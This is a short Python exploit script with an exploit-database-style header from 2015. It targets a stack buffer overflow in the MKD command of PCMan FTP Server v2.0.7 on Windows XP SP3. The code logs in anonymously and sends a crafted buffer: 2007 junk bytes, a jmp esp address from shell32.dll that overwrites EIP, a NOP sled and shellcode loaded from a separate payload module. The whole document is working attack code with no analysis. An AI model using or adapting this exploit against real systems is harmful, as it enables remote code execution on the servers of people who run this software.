# Title: PCMan FTP Server v2.0.7 Buffer Overflow - MKD Command
# Date : 12/02/2015 
# Author: R-73eN
# Software: PCMan FTP Server v2.0.7
# Tested On Windows Xp SP3
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port): 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server = target_machine
    port = target_port
    s.connect((server, port))
    a = s.recv(1024)
    
    s.send(b'User anonymous')
    s.recv(1024)
    s.send(b'pass')
    s.recv(1024)
    
    evil = b'A' * 2007 #JUNK
    evil += b'\x65\x82\xA5\x7C' # EIP overwrite jmp esp / shell32.dll
    evil += b'\x90' * 10
    evil += buf
  
    s.send(b'mkd ' + evil)
   